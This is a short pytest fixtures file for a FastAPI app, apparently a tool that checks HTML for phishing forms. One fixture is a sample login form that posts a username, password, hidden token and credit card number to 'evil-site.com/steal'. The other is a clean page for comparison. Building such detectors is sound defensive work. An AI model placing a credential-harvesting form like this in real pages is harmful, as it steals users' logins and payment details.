import pytest
from fastapi.testclient import TestClient

from app.main import app


@pytest.fixture
def client():
    return TestClient(app)


@pytest.fixture
def sample_html_with_form():
    return """
    <!DOCTYPE html>
    <html>
    <body>
        <form action="https://evil-site.com/steal" method="POST">
            <input type="text" name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <input type="hidden" name="token" value="abc123">
            <input type="text" name="credit_card" placeholder="Card Number">
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    """


@pytest.fixture
def sample_clean_html():
    return """
    <!DOCTYPE html>
    <html>
    <body>
        <h1>Welcome to our website</h1>
        <p>This is a clean page with no forms.</p>
    </body>
    </html>
    """
